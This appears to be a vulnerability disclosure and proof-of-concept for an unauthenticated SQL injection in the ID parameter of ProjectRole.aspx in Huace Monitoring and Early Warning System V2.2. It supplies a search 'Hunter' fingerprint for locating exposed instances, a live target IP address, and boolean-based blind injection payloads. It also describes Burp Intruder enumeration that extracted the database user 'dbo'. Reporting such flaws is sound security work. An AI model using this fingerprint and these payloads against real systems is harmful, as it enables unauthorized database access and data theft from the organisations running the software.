Hunter:

```
body="App_Themes/Flat/Login/backgroundEn.png"
```
<img width="1274" height="598" alt="image" src="https://github.com/user-attachments/assets/abf05cf1-5752-4206-ab58-0a23c87ed6b3" />

Title:

```
Unauthenticated SQL injection vulnerability exists in version 2.2 of Huace Monitoring and Early Warning System.
```

Interface:
```
/Web/SysManage/ProjectRole.aspx
```

Vendor Homepage:

```
https://www.huace.cn/
```

Version: 

```
V2.2
```

Tested on: 

```
ASPX
```

Affected Page:

Target:

```
http://124.71.143.18:8001/
```

Route:
```
/Web/SysManage/ProjectRole.aspx?&ID=1
```

Details：

```
The ID parameter of the ProjectRole.aspx file in version 2.2 of the Huace Monitoring and Early Warning System. This vulnerability arises because the parameter is directly concatenated into SQL queries without input sanitization or the use of parameterized statements, allowing attackers to manipulate query logic and potentially bypass authentication.
```


Proof of vulnerability:


Payload:

'+or+'a'='a  

When entering +'or'a'='a, a 302 redirect response is returned.
<img width="1338" height="660" alt="image" src="https://github.com/user-attachments/assets/bb61acb4-d91e-4b1c-8e21-ea38eab5905f" />

'+or+'a'='b

When entering 'or'a'='b, a 200 status code is returned, and there is a difference in content length.
<img width="1344" height="642" alt="image" src="https://github.com/user-attachments/assets/26152cf2-604e-4e0a-948d-968b06223146" />


payload： '+or+current_user+like+'a% 

Through the aforementioned differential response, attempt to send to the Intruder module of BurpSuite to obtain the database username..
<img width="1080" height="756" alt="image" src="https://github.com/user-attachments/assets/c7ed2094-1558-4cb1-a815-da7e61ec2e39" />

Final Database User：dbo
<img width="1341" height="696" alt="image" src="https://github.com/user-attachments/assets/0e52ec9c-6771-441c-a429-38c33be4fbee" />

Verify：dbs   200 status code is returned, and there is a difference in content length.
<img width="1326" height="636" alt="image" src="https://github.com/user-attachments/assets/b8bc5b27-d3da-49cc-bdf1-63a7e0e4eced" />


